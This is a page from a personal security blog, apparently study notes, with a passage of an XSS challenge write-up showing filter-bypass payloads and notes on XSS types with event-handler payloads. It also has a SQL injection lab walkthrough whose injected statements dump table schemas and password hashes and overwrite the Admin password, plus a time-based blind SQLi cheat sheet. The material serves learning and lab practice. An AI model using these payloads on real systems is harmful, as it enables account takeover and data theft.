<h4 id="解决方法：-5"><a href="#解决方法：-5" class="headerlink" title="解决方法："></a>解决方法：</h4><ol>
<li><p><del>jsfuck</del> ：[ ]!+都被过滤了</p>
</li>
<li><p>unicode有三种表现形式：&amp;#、&amp;#x、\u</p>
<p>​    \u 开头和 &amp;#x 开头是一样的 都是16进制 unicode字符的不同写法</p>
<p>​    &amp;# 则是 unicode字符的10进制的写法</p>
<p>alert==&gt;\u unicode如下</p>
<p>​        <del>\u0061\u006c\u0065\u0072\u0074</del>因为\被过滤了</p>
<p>alert==&gt;&amp;# unicode如下</p>
<p>​        &amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;</p>
</li>
</ol>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> val = <span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>);</span><br><span class="line"><span class="built_in">document</span>.write(val);<span class="comment">//output:alert</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str1 = <span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116))(1337)&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.write(str1.length);<span class="comment">//output:51 超过50所以这个方法不行，但是可以成功输出小于四位数值</span></span><br></pre></td></tr></table></figure>

<p>​    <strong>①</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mafia = <span class="built_in">Function</span>(<span class="regexp">/ALERT(1337)/</span>.source.toLowerCase())()</span><br><span class="line">==》相当于 mafia = <span class="built_in">Function</span>(alert(<span class="number">1337</span>))()</span><br><span class="line">==&gt;最后<span class="built_in">eval</span>(<span class="built_in">Function</span>(alert(<span class="number">1337</span>))())</span><br></pre></td></tr></table></figure>

<p>​    <strong>②</strong></p>
<p>​    将alert用parseInt函数改为用数字表示</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&quot;alert&quot;</span>, <span class="number">30</span>)<span class="comment">//为什么是30上面知识清单有解析</span></span><br><span class="line">》》》<span class="number">8680439</span></span><br><span class="line"></span><br><span class="line"><span class="number">8680439.</span>.toString(<span class="number">30</span>)即为alert</span><br><span class="line"></span><br><span class="line">所以将mafia = <span class="built_in">eval</span>(<span class="number">8680439.</span>.toString(<span class="number">30</span>))(<span class="number">1337</span>)</span><br><span class="line">最后<span class="built_in">eval</span>(mafia) = <span class="built_in">eval</span>(<span class="number">8680439.</span>.toString(<span class="number">30</span>))(<span class="number">1337</span>)) = <span class="built_in">eval</span>(alert(<span class="number">1337</span>))</span><br></pre></td></tr></table></figure>

<p>​    <strong>③</strong></p>
<p>​    这种方式我觉得是最巧，最容易的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mafia=<span class="built_in">eval</span>(location.hash.slice(<span class="number">1</span>))#alert(<span class="number">1337</span>)</span><br><span class="line">在控制台上</span><br><span class="line"><span class="built_in">console</span>.log(mafia)</span><br><span class="line">》》》<span class="built_in">eval</span>(location.hash.slice(<span class="number">1</span>))</span><br><span class="line">最后<span class="built_in">eval</span>(mafia) = <span class="built_in">eval</span>(<span class="built_in">eval</span>(location.hash.slice(<span class="number">1</span>))) = <span class="built_in">eval</span>(alert(<span class="number">1337</span>))</span><br></pre></td></tr></table></figure>



<h1 id="8-Ok-Boomer"><a href="#8-Ok-Boomer" class="headerlink" title="8.Ok, Boomer"></a>8.Ok, Boomer</h1><h4 id="知识清单：-7"><a href="#知识清单：-7" class="headerlink" title="知识清单："></a>知识清单：</h4><p>​    </p>
<h4 id="解决方法：-6"><a href="#解决方法：-6" class="headerlink" title="解决方法："></a>解决方法：</h4><h4 id=""><a href="#" class="headerlink" title=""></a></h4>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/13/XSS-steal%20cookies/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/13/XSS-steal%20cookies/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-13 13:14:18" itemprop="dateCreated datePublished" datetime="2021-09-13T13:14:18+08:00">2021-09-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/11/XSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/11/XSS/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-11 16:12:46" itemprop="dateCreated datePublished" datetime="2021-09-11T16:12:46+08:00">2021-09-11</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-29 16:16:10" itemprop="dateModified" datetime="2021-10-29T16:16:10+08:00">2021-10-29</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="xss攻击种类"><a href="#xss攻击种类" class="headerlink" title="xss攻击种类"></a>xss攻击种类</h3><ol>
<li>Reflected XSS</li>
<li>Stored XSS</li>
<li>DOM-based XSS</li>
</ol>
<h3 id="Reflected-XSS-反射型XSS"><a href="#Reflected-XSS-反射型XSS" class="headerlink" title="Reflected XSS 反射型XSS"></a>Reflected XSS 反射型XSS</h3><img src="D:\blog\H01iday\source\_posts\pics\反射xss.png" alt="反射xss" style="zoom: 80%;" />

<p>①用户正常登录应用程序，得到一个包含会话令牌的 cookie：</p>
<p><img src="D:\blog\H01iday\source_posts\pics\反射xss1.png" alt="反射xss1"></p>
<p>②攻击者通过某种方法向用户提交以下 URL，这个URL包含嵌入式 JavaScript 代码：</p>
<p><img src="D:\blog\H01iday\source_posts\pics\反射xss1.png" alt="反射xss1"></p>
<p>③ 用户从应用程序中访问攻击者传送给他的URL。</p>
<p>④服务器响应用户的请求。由于应用程序中存在XSS漏洞，响应中包含攻击者创建的 JavaScript代码。</p>
<p>⑤用户浏览器收到攻击者的JavaScript代码，像执行从应用程序收到的其他代码一样，浏览器执行这段代码。</p>
<p>⑥攻击者创建的恶意JavaScript代码为：</p>
<p><img src="D:\blog\H01iday\source_posts\pics\反射xss3.png" alt="反射xss3"></p>
<p>⑦这段代码可让用户浏览器向wahh-attacker.com（攻击者拥有的一个域）提出一个请求。请求中包含用户访问应用程序的当前会话令牌：</p>
<p><img src="D:\blog\H01iday\source_posts\pics\反射xss4.png" alt="反射xss4"></p>
<p>⑧攻击者监控访问wahh-attacker.com的请求并截获到用户的请求。劫持到用户的会话令牌，从而可以通过该令牌代表用户登录应用程序。</p>
<h3 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h3><p> Stored XSS is when code is able to be stored on a web page where users can navigate to the page (or load it by some other means like an iframe) and the code will always be executed. This is arguably one of the most dangerous forms of XSS as it is impossible to detect without reading the page (and possibly executing the code).</p>
<p>【我认为反射性XSS和存储型XSS的区别是在于：反射性是需要诱骗用户去点击特定的URL才能触发，如果用户不点击对应的URL就没有危险；但是存储型是我只要进去这个网页，xss代码就会自动从数据库返回并在我的浏览器执行，所以存储型的xss非常危险】</p>
<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><p>DOM XSS的XSS代码不需要服务端解析响应的直接参与，<strong>触发XSS的是浏览器端的DOM解析</strong></p>
<h3 id="累积知识点："><a href="#累积知识点：" class="headerlink" title="累积知识点："></a>累积知识点：</h3><h4 id="lt-body-gt-标签："><a href="#lt-body-gt-标签：" class="headerlink" title="&lt;body&gt;标签："></a>&lt;body&gt;标签：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span> //用户浏览网页时出发JavaScript</span><br></pre></td></tr></table></figure>

<h4 id="lt-video-gt-标签"><a href="#lt-video-gt-标签" class="headerlink" title="&lt;video&gt;标签:"></a>&lt;video&gt;标签:</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onloadstart</span>=<span class="string">alert(1)</span> <span class="attr">src</span>=<span class="string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span>//视频开始加载时执行JavaScript</span><br></pre></td></tr></table></figure>

<h4 id="lt-style-gt-标签："><a href="#lt-style-gt-标签：" class="headerlink" title="&lt;style&gt;标签："></a>&lt;style&gt;标签：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="JavaScript-escape-函数"><a href="#JavaScript-escape-函数" class="headerlink" title="JavaScript escape()函数"></a>JavaScript escape()函数</h4><p>对字符串进行编码，则可以在所有计算机上读取该字符串</p>
<p>不会对字母和数字编码，也不对* @ - _ + . / 。编码。其它字符会替换为十六进制转义序列</p>
<h4 id="Javascript-unescape-函数"><a href="#Javascript-unescape-函数" class="headerlink" title="Javascript unescape()函数"></a>Javascript unescape()函数</h4><p>解码被escape函数编码的内容</p>
<h4 id="JavaScript-location-hash属性"><a href="#JavaScript-location-hash属性" class="headerlink" title="JavaScript location.hash属性"></a>JavaScript location.hash属性</h4><p>该字符串是 URL 的锚部分（从 # 号开始的部分）。</p>
<p>例：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL：http:<span class="comment">//www.runoob.com/test.htm＃PART2</span></span><br><span class="line"><span class="built_in">document</span>.write(location.hash);</span><br><span class="line">》》#part2</span><br></pre></td></tr></table></figure>

<h4 id="location-search属性"><a href="#location-search属性" class="headerlink" title="location.search属性"></a>location.search属性</h4><p>search 属性是一个可读可写的字符串，可设置或返回当前 URL 的查询部分（问号 ? 之后的部分）</p>
<p>例：假设当前的URL就是<a target="_blank" rel="noopener" href="http://www.runoob.com/submit.htm?email=someone@example.com">http://www.runoob.com/submit.htm?email=someone@example.com</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(location.search);</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">返回的结果</span><br><span class="line">》》?email=someone@example.com</span><br></pre></td></tr></table></figure>






      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/11/sqllab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/11/sqllab/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-09-11 10:20:18 / Modified: 15:35:25" itemprop="dateCreated datePublished" datetime="2021-09-11T10:20:18+08:00">2021-09-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="SQL-Injection-1-Input-Box-Non-String-即数字型注入"><a href="#SQL-Injection-1-Input-Box-Non-String-即数字型注入" class="headerlink" title="SQL Injection 1: Input Box Non-String 即数字型注入"></a>SQL Injection 1: Input Box Non-String 即数字型注入</h4><p>无需’，直接注入1 or 1=1– -即可</p>
<h4 id="SQL-Injection-2-Input-Box-String-即字符型注入"><a href="#SQL-Injection-2-Input-Box-String-即字符型注入" class="headerlink" title="SQL Injection 2: Input Box String  即字符型注入"></a>SQL Injection 2: Input Box String  即字符型注入</h4><p>需要’，注入1’ or 1==1– - </p>
<h4 id="SQL-Injection-3-URL-Injection"><a href="#SQL-Injection-3-URL-Injection" class="headerlink" title="SQL Injection 3 : URL Injection"></a>SQL Injection 3 : URL Injection</h4><p>GET request的内容会呈现在url上，可以通过直接修改url实现注入</p>
<h4 id="SQL-Injection-4-POST-Injection"><a href="#SQL-Injection-4-POST-Injection" class="headerlink" title="SQL Injection 4: POST Injection"></a><strong>SQL Injection 4: POST Injection</strong></h4><p>POST request的内容不会呈现在url上，但是可以通过burp等代理软件修改</p>
<p>[injection 3-4都是可以用来绕过js的限制]</p>
<h4 id="SQL-Injection-5：Attack-on-an-UPDATE-Statement"><a href="#SQL-Injection-5：Attack-on-an-UPDATE-Statement" class="headerlink" title="SQL Injection 5：Attack on an UPDATE Statement"></a>SQL Injection 5：Attack on an UPDATE Statement</h4><p>预备知识：</p>
<p>SQLite数据库中group_concat(x [ , y])函数</p>
<p><code>The group_concat() function returns a string which is the concatenation of all non-NULL values of *X*. If parameter *Y* is present then it is used as the separator between instances of *X*. A comma (&quot;,&quot;) is used as the separator if *Y* is omitted. The order of the concatenated elements is arbitrary.</code></p>
<p>情景：有一个更新用户信息的表单。进行注入，并修改其它用户的登陆密码。</p>
<h5 id="step1：查看源码，查看对应text的信息。对其在数据库中的列名进行猜测。"><a href="#step1：查看源码，查看对应text的信息。对其在数据库中的列名进行猜测。" class="headerlink" title="step1：查看源码，查看对应text的信息。对其在数据库中的列名进行猜测。"></a>step1：查看源码，查看对应text的信息。对其在数据库中的列名进行猜测。</h5><p>​            这里猜测Nick Name–》nickname</p>
<p>​                            E-mail–》email</p>
<p>​                            Password–》password</p>
<p><img src="D:\blog\H01iday\source_posts\pics\update1.png" alt="update1"></p>
<h5 id="step2：尝试，查看是否可以进行注入"><a href="#step2：尝试，查看是否可以进行注入" class="headerlink" title="step2：尝试，查看是否可以进行注入"></a>step2：尝试，查看是否可以进行注入</h5><img src="D:\blog\H01iday\source\_posts\pics\update2.png" alt="update2" style="zoom:67%;" />

<img src="D:\blog\H01iday\source\_posts\pics\update3.png" alt="update2" style="zoom:67%;" />

<p>这里email没有改变是因为，后面又有一个email=’‘，覆盖了前面的email=’hack‘</p>
<img src="D:\blog\H01iday\source\_posts\pics\update4.png" alt="update2" style="zoom:67%;" />

<img src="D:\blog\H01iday\source\_posts\pics\update5.png" alt="update2" style="zoom:67%;" />

<p>这里两个都发生了改变，nickname=’‘和email=’‘都被后面添加的注入内容覆盖了</p>
<h5 id="step3：根据不同数据库查看版本号的不同方式，试出数据库的类型"><a href="#step3：根据不同数据库查看版本号的不同方式，试出数据库的类型" class="headerlink" title="step3：根据不同数据库查看版本号的不同方式，试出数据库的类型"></a>step3：根据不同数据库查看版本号的不同方式，试出数据库的类型</h5><p><code>&#39;,nickname=sqlite_version(),email=&#39;hack</code>通过注入此句，得到版本号，可知为SQLite数据库</p>
<h5 id="step4：根据数据库，获得所有表的信息"><a href="#step4：根据数据库，获得所有表的信息" class="headerlink" title="step4：根据数据库，获得所有表的信息"></a>step4：根据数据库，获得所有表的信息</h5><p><code>&#39;,nickname=sqlite_version(),email=&#39;hack</code></p>
<img src="D:\blog\H01iday\source\_posts\pics\update6.png" alt="update6" style="zoom:67%;" />

<p>可知，数据库中有两个表：usertable和secrets</p>
<h5 id="step5：根据数据库和表名，获得列名"><a href="#step5：根据数据库和表名，获得列名" class="headerlink" title="step5：根据数据库和表名，获得列名"></a>step5：根据数据库和表名，获得列名</h5><p><code>&#39;,nickname=(select group_concat(sql) from sqlite_master),email=&#39;hack</code></p>
<p>获得创建两个表的sql语句</p>
<img src="D:\blog\H01iday\source\_posts\pics\update7.png" alt="update7" style="zoom:67%;" />

<p>usertable有UID、name、profileID、salary等信息</p>
<h5 id="step6：根据表名列名获得profileID和password"><a href="#step6：根据表名列名获得profileID和password" class="headerlink" title="step6：根据表名列名获得profileID和password"></a>step6：根据表名列名获得profileID和password</h5><p><code>&#39;,nickname=(select group_concat(name||&#39;~&#39;||profileID||&#39;~&#39;||password,&#39;;&#39;) from usertable),email=&#39;hack</code></p>
<img src="D:\blog\H01iday\source\_posts\pics\update8.png" alt="update8" style="zoom:67%;" />

<h5 id="step7：可以看到，password都被hash了，更改密码储存的时候也是对应的hash方式。现在任务为找到hash方法"><a href="#step7：可以看到，password都被hash了，更改密码储存的时候也是对应的hash方式。现在任务为找到hash方法" class="headerlink" title="step7：可以看到，password都被hash了，更改密码储存的时候也是对应的hash方式。现在任务为找到hash方法"></a>step7：可以看到，password都被hash了，更改密码储存的时候也是对应的hash方式。现在任务为找到hash方法</h5><p>​                在github找到<a target="_blank" rel="noopener" href="https://github.com/AnimeshShaw/Hash-Algorithm-Identifier/blob/master/hashidentifier/HashIdentifier.py">hash-identifier</a>的源码，下载下来在pycharm执行，输入任选一个password，判断出来是sha-256的加密方式</p>
<p><img src="D:\blog\H01iday\source_posts\pics\update9.png" alt="update9"></p>
<h5 id="step8：对新密码在CyberChef进行对应的hash"><a href="#step8：对新密码在CyberChef进行对应的hash" class="headerlink" title="step8：对新密码在CyberChef进行对应的hash"></a>step8：对新密码在<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=SHA2('256',64,160)">CyberChef</a>进行对应的hash</h5><img src="D:\blog\H01iday\source\_posts\pics\update10.png" alt="update10" style="zoom: 67%;" />

<h5 id="step9：修改Admin的密码并登录"><a href="#step9：修改Admin的密码并登录" class="headerlink" title="step9：修改Admin的密码并登录"></a>step9：修改Admin的密码并登录</h5><p><code>&#39;,password = &#39;5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8&#39; where name=&#39;Admin&#39;-- -</code>注入</p>
<p>查看修改成功了</p>
<p><img src="D:\blog\H01iday\source_posts\pics\update11.png" alt="update11"></p>
<p>step10：成功登录</p>
<img src="D:\blog\H01iday\source\_posts\pics\update12.png" alt="update12" style="zoom:67%;" />
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/11/Blind%20SQL%20injection%20with%20time%20delays/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/11/Blind%20SQL%20injection%20with%20time%20delays/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-09-11 09:24:11 / Modified: 10:19:10" itemprop="dateCreated datePublished" datetime="2021-09-11T09:24:11+08:00">2021-09-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>当无论注入任何SQL语句，不会对页面返回造成任何影响的时候，即使是trigger SQL error也不会显示任何不同。这个时候，可以使用延时注入。</p>
<table>
<thead>
<tr>
<th>数据库</th>
<th>syntax</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Oracle</strong></td>
<td>dbms_pipe.receive_message((‘a’),10)</td>
</tr>
<tr>
<td><strong>Microsoft</strong></td>
<td>WAITFOR DELAY ‘0:0:10’</td>
</tr>
<tr>
<td><strong>PostgreSQL</strong></td>
<td>SELECT pg_sleep(10)</td>
</tr>
<tr>
<td><strong>MySQL</strong></td>
<td>SELECT sleep(10)</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>数据库</th>
<th>延时注入使用方法</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Oracle</strong></td>
<td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN ‘a’||dbms_pipe.receive_message((‘a’),10) ELSE NULL END FROM dual</td>
</tr>
<tr>
<td><strong>Microsoft</strong></td>
<td>IF (YOUR-CONDITION-HERE) WAITFOR DELAY ‘0:0:10’</td>
</tr>
<tr>
<td><strong>PostgreSQL</strong></td>
<td>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</td>
</tr>
<tr>
<td><strong>MySQL</strong></td>
<td>SELECT IF(YOUR-CONDITION-HERE,sleep(10),’a’)</td>
</tr>
</tbody></table>
<hr>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">H01iday</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  




  





</body>
</html>
